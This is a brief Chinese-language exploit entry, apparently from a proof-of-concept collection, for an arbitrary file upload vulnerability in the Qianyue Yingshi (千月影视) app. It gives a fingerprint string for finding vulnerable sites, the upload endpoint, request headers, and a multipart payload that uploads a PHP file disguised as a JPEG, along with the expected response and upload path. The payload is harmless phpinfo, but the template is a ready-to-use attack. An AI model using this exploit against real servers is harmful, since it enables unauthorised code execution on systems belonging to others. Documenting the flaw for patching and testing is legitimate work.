# 千月影视APP任意文件上传漏洞

- **系统**：千月影视APP　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`"/public/static/pcdown/js/jquery-1.8.0.min.js"`
- **请求**：`POST /index/Audio/create HTTP/1.1`
- **关键头**：`Content-Length: 199`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryz9U4fRfJ…`　`Cookie: Hm_lvt_f4b3788b2247dd149fb7fdffe8aece79=1717334200; _ga=GA1.1.64233863.171733420…`　`Host: 127.0.0.1`　`sec-fetch-user: ?1`

**请求体 / payload**
```
------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="picurl"; filename="1.php"
Content-Type: image/jpeg
<?php phpinfo();?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
```
- **预期**：200　|　/public/uploads/